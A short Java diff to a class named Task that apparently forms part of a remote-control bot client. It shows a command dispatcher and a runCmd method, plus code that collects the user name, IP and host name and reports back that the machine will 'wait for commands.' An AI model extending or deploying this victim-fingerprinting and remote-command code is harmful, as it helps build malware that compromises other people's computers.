@@ -48,7 +48,7 @@ public class Task {
                 getWebPage(cmd);
             }
             else if(type == HELLO){
-                if(cmd.equals("How are you?")){
+                if(cmd.equals("How are You?")){
                     response = sayHello();
                 }
 
@@ -63,7 +63,6 @@ public class Task {
             sendResponse();
             return true;
         }
-
     private String runCmd() {
         try {
             StringBuilder stringBuilder = new StringBuilder();
@@ -95,7 +94,7 @@ public class Task {
             String userName = new com.sun.security.auth.module.NTSystem().getName();
             String IP = br.readLine();
             String host = inetAddress.getHostName();
-            return String.format("I am fine! %s send kisses from IP %s and device %s", userName, IP, host);
+            return String.format("Hello, %s from IP %s and device %s wait for commands.", userName, IP, host);
         }catch (UnknownHostException | MalformedURLException uhe){
             System.out.println("I am not feeling well! I don't know where am I...");
         } catch (IOException e) {
